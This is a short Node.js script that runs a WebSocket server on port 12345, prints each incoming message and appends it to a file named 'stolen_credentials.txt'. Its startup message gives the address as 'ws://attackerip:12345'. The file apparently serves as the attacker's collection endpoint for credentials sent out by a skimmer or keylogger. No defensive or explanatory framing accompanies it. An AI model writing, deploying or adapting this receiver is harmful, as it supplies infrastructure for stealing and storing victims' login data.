const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 12345 });

wss.on('connection', (ws) => {
    console.log("New connection established.");

    ws.on('message', (message) => {
        console.log('Received:', message);

        // Optionally save the message to a log file
        const fs = require('fs');
        fs.appendFileSync('stolen_credentials.txt', message + '\n');
    });

    ws.on('close', () => {
        console.log('Connection closed.');
    });
});

console.log('WebSocket server is running on ws://attackerip:12345');
